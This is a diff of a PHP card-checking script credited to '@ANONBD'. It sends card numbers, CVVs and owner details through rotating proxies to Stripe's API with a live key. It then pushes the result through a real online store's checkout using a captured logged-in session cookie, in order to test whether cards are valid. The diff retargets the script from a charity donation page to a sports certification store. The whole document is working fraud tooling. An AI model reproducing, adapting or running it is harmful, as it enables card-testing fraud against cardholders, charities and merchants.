@@ -116,24 +116,23 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://www.bgcmilwaukee.org/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-  'authority: www.bgcmilwaukee.org',
+  'authority: api.stripe.com',
   'method: POST',
-  'path: 	/wp-admin/admin-ajax.php',
+  'path: /v1/sources',
   'scheme: https',
-  'accept: application/json, text/javascript, */*; q=0.01',
+  'accept: application/json',
   'accept-language: en-US,en;q=0.5',
-  'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-  'Cookie: X-Mapping-liijibeb=0E6B0169BA316962089D0186B75CF1D2; _gcl_au=1.1.588545134.1647735217; _ga=GA1.2.912254991.1647735224; _gid=GA1.2.1108072043.1647735224; _fbp=fb.1.1647735226175.489993399; __atuvc=2%7C12; __atuvs=623671b81e108981001; __atssc=google%3B1; __stripe_mid=0cb6c2ba-f278-455a-8a31-191242e5eaec75222e; __stripe_sid=90d6b853-5e30-440b-926a-4573f0e7e48e14592e; bnHidr1647712800000=1',
-  'origin: https://www.bgcmilwaukee.org',
-  'referer: https://www.bgcmilwaukee.org/give-today/donate/',
+  'content-type: application/x-www-form-urlencoded',
+  'origin: https://js.stripe.com',
+  'referer: https://js.stripe.com/',
   'sec-fetch-dest: empty',
   'sec-fetch-mode: cors',
   'sec-fetch-site: same-site',
-  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
+  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
   ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -144,7 +143,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=gfstripe_get_country_code&nonce=2839ead2d9&country=United+States&feed_id=35');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[address][line1]='.$street.'&owner[address][state]='.$state.'&owner[address][city]='.$street.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&owner[email]='.$email.'&owner[phone]='.$phone.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F0ba445fb4%3B+stripe-js-v3%2F0ba445fb4&time_on_page=44458&key=pk_live_5190OtwFHm5zPuZiK7mTaylT6t3zhd8tn2VbB32nYYoy0uFtYXk1GXtesr6HCfiOIL5mwn8vORwNWtAX1IeJxoTeX00QWv2haoE');
 
 
 
@@ -156,7 +155,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_URL, 'https://certified.rapsodo.com/?wc-ajax=checkout');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -167,24 +166,25 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.stripe.com',
+'authority: certified.rapsodo.com',
 'method: POST',
-'path: /v1/payment_methods',
+'path: /?wc-ajax=checkout',
 'scheme: https',
-'accept: application/json',
-'accept-language: en-US,en;q=0.5',
-'content-type: application/x-www-form-urlencoded',
-'origin: https://js.stripe.com',
-'referer: https://js.stripe.com/',
+'accept: application/json, text/javascript, */*; q=0.01',
+'accept-language: en-US,en;q=0.9',
+'Cookie: wp_woocommerce_session_8c3e3ac310f0a2c0fe3b597f9cc5ddc5=5498%7C%7C1647803515%7C%7C1647799915%7C%7C8adfc68eccf6a84e7df5fbd406fe81ce; woocommerce_items_in_cart=1; woocommerce_cart_hash=fcb3fce8ee65a822d9d94c10d42bc5c5; cartflows_session_2434=2434_764c606f416649b597412bd56e1a88b9; wcf-visited-flow-2434=%5B2435%5D; _ga=GA1.2.1107550084.1647630753; _gid=GA1.2.660530872.1647630753; wordpress_logged_in_8c3e3ac310f0a2c0fe3b597f9cc5ddc5=djfiurfei%40yahoo.com%7C1648840472%7Cu7kIk8wiSkBghT8fP4jbJ4XObBYcz1efVH5GwiE80Sq%7C992f1009cf828c77b0b831778f33ecb88c20a827c147bc2ddd102ca5156cc78b; _gat_gtag_UA_88913759_1=1',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'origin: https://certified.rapsodo.com',
+'referer: https://certified.rapsodo.com/checkout/baseball-pitching-certification/bbp-payment/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
 'X-Requested-With: XMLHttpRequest',
 ));
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'type=card&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=145&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=0cb6c2ba-f278-455a-8a31-191242e5eaec75222e&sid=90d6b853-5e30-440b-926a-4573f0e7e48e14592e&pasted_fields=number&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=729251&key=pk_live_MuRlTpTX7o1BUeTkmKPG78Id00kghrsjL8');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=M&billing_last_name=Smith&billing_company=D&billing_country=US&billing_address_1=250+VESEY+ST+FL+4&billing_address_2=g&billing_city=New+York+City&billing_state=NY&billing_postcode=10080&billing_phone=8183084665&billing_email=makode2570%40dxecig.com&_wcf_flow_id=2434&_wcf_checkout_id=2435&coupon_code=&payment_method=stripe&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce=706c61bf06&_wp_http_referer=%2Fcheckout%2Fbaseball-pitching-certification%2Fbbp-payment%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$id.'');
 
 
 $result2 = curl_exec($ch);
@@ -489,8 +489,8 @@ else {
 curl_close($ch);
 ob_flush();
 
-//echo "<b>1REQ Result:</b> $result1<br><br>";
-//echo "<b>2REQ Result:</b> $result2<br><br>";
+echo "<b>1REQ Result:</b> $result1<br><br>";
+echo "<b>2REQ Result:</b> $result2<br><br>";
 
 #---------------------------------------------------------------------------------------------------------------------------------#
 #---------------------------------------------------[MADE BY @ANONBD]----------------------------------------------------#
